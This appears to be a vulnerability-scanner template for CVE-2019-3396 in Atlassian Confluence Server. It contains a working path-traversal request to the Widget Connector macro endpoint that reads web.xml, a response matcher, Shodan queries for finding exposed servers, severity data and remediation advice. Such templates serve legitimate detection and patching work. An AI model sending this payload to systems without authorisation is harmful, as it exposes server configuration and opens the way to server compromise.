http:
- matchers:
  - type: word
    words:
    - <param-name>contextConfigLocation</param-name>
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /rest/tinymce/1/macro/preview HTTP/1.1

    Host: {{Hostname}}

    Referer: {{Hostname}}


    {"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

    '
id: CVE-2019-3396
info:
  author: harshbothra_
  classification:
    cpe: cpe:2.3:a:atlassian:confluence:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-3396
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99997
    epss-score: 0.94472
  description: The Widget Connector macro in Atlassian Confluence Server before version
    6.6.12 (the fixed version for 6.6.x), from version 6.7.0 before 6.12.3 (the fixed
    version for 6.12.x), from version 6.13.0 before 6.13.3 (the fixed version for
    6.13.x), and from version 6.14.0 before 6.14.2 (the fixed version for 6.14.x),
    allows remote attackers to achieve path traversal and remote code execution on
    a Confluence Server or Data Center instance via server-side template injection.
  impact: 'Unauthenticated attackers can exploit server-side template injection to
    achieve path traversal and execute arbitrary code, leading to complete Confluence
    server compromise.

    '
  metadata:
    max-request: 1
    product: confluence
    shodan-query:
    - http.component:"Atlassian Confluence"
    - cpe:"cpe:2.3:a:atlassian:confluence"
    - http.component:"atlassian confluence"
    vendor: atlassian
  name: Atlassian Confluence Server - Path Traversal
  reference:
  - https://github.com/x-f1v3/CVE-2019-3396
  - https://nvd.nist.gov/vuln/detail/CVE-2019-3396
  - https://jira.atlassian.com/browse/CONFSERVER-57974
  - http://packetstormsecurity.com/files/152568/Atlassian-Confluence-Widget-Connector-Macro-Velocity-Template-Injection.html
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Apply the necessary security patches or upgrade to a patched version
    of Atlassian Confluence Server to mitigate this vulnerability.

    '
  severity: critical
  tags: cve,cve2019,atlassian,confluence,lfi,rce,kev,packetstorm,vkev,vuln
